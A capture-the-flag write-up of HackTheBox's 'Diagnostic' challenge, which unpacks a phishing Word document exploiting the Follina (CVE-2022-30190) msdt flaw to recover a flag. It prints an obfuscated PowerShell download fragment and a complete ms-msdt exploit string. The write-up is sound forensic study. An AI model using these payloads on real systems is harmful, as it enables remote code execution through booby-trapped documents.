---
title: Analyzing Malicious Word Documents (HTB Challenge - Diagnostic)
date: 2025-12-3 12:40:01 +/-0000
categories: [Education, Write Ups]
tags: [linux, bash, hackthebox, malware analysis, cve]
author: cblake
description: An Analysis and Write Up of HackTheBox's Diagnostic, a forensics challenge.
comments: false
image:
  path: /assets/img/diagnostic/logo.png
  alt: The logo for this HackTheBox challenge.

---


<h2>Overview</h2>
Diagnostic is a forensics challenge on HTB that involves analyzing a malicious word document. The scenario reads as follows:

"Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on."

<h2>Analysis</h2>
First thing we need to do is get this word document. We can go ahead and edit our address into `/etc/hosts` so that the address can be resolved. It should look something like this, or have more addresses if you've done more labs/challenges with HTB.

`/etc/hosts` :

```
# Static table lookup for hostnames.
# See hosts(5) for details.

83.136.251.105 diagnostic.htb
```

Now let's do ahead and grab our file by visiting: diagnostic.htb:32559/layoffs.doc
We included the port number since the default port is not 80.

I saved my file in it's own directory for easy analysis.
![img-description](assets/img/diagnostic/1.png)

We know that this doc is malicious, so for best practice do not open it, unless you are in a sandboxed environment.

We can run `file` on it to gather information regarding this file:
![img-description](assets/img/diagnostic/2.png)
We notice that it actually contains zip data, so let's make a copy of it and handle it as a zip file.

```
cp layoffs.doc layoffs.zip
unzip layoffs.zip
```
![img-description](assets/img/diagnostic/3.png)
We notice there are now multiple different directories that have been created from this. There are a LOT of .xml files we can go through, but we can also use a couple of commands to see if we can gather some easy information. We can start by catting all files and grepping for 'htb'. Go ahead and move layoffs.doc and layoffs.zip into a separate directory so it doesn't get in the way.
`find . -type f -exec cat {} + | grep htb`

We notice there is a url that is different from the one we used, that is supposed to be linked to some sort of theme.
![img-description](assets/img/diagnostic/4.png)
`http://diagnostic.htb:32559/223_index_style_fancy.html!`

We can use curl to take a closer look:
`curl http://diagnostic.htb:32559/223_index_style_fancy.html`

Upon running this we find the base64 payload.
![img-description](assets/img/diagnostic/5.png)
Let's copy this and put it into CyberChef so we can get a closer look.
https://gchq.github.io/CyberChef/
Upon getting to CyberChef let's go ahead and add a "From Base64" operation to the recipe.
Now let's put in our base64 information.

![img-description](assets/img/diagnostic/6.png)

Here we see sort of song lyric, but also the payload is above it.
Upon taking a closer look we see a section that reads:
```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f
```
Looking at the curly brackets and the capital letters that form HTB, this is our flag.

We see it's in a sequence of  {7}{1}{6}{8}{5}{3}{2}{4}{0}
- `{7}` → `HT`
- `{1}` → `B{msDt_4s_A_pr0`
- `{6}` → `toC`
- `{8}` → `0l_h4nD`
- `{5}` → `l3`
- `{3}` → `r...s`
- `{2}` → `E`
- `{4}` → `3Ms_b4D`
- `{0}` → `}.exe`

Putting things together, we found our flag to be:
`HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}`

<h2>Conclusion</h2>
This challenge on HTB is certainly difficult if you do not have a clue as to how you can evaluate a malicious word document, however performing everything here is actually easy. This challenge is based off of CVE-2022-30190, which is known as Follina. This vulnerability exploits how msdt.exe processes malformed URIs, that have a long length and end with a '!' (as shown by the url we found earlier.) So whenever the word document is opened, the HTML payload is executed, but it is required to exceed 4096 bytes, hence the song lyrics that were found within the payload. The payload often includes a section of information like this:

```
_ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'bm90ZXBhZA=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"_
```
It's a very difficult exploit to detect, and it opens up RCE, making it very dangerous. Especially with the fact it can be engaged from opening a simple word document.
